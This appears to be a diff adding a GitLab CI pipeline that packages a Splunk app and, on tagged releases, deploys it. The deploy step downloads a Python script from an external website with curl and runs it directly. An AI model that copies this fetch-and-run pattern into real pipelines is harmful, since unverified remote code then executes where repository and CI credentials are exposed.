@@ -1,0 +1,29 @@
+stages:
+  - package-app
+  - deploy
+  
+package-app:
+  image: livehybrid/splunk-appbuilder:latest
+  stage: package-app
+  script:
+    # make the package
+    - make clean
+    - make package
+    - make package_test
+    - cp out/packages/splunkbase/*.tar.gz out/packages/splunkbase/$CI_PROJECT_NAME-$CI_COMMIT_SHORT_SHA.tar.gz
+  artifacts:
+    paths:
+    - out/packages/splunkbase/$CI_PROJECT_NAME-$CI_COMMIT_SHORT_SHA.tar.gz
+    reports:
+      junit: test-reports/*.xml
+
+deploy:
+    stage: deploy
+    image: 
+      name: registry.gitlab.com/deviosec/containers/release:latest
+      entrypoint: ["/bin/sh", "-i", "-c"]
+    script:
+        - curl https://dash.bowl-online.co.uk/git.py -o /opt/gitlab-api/main.py
+        - python3 /opt/gitlab-api/main.py
+    only:
+        - tags
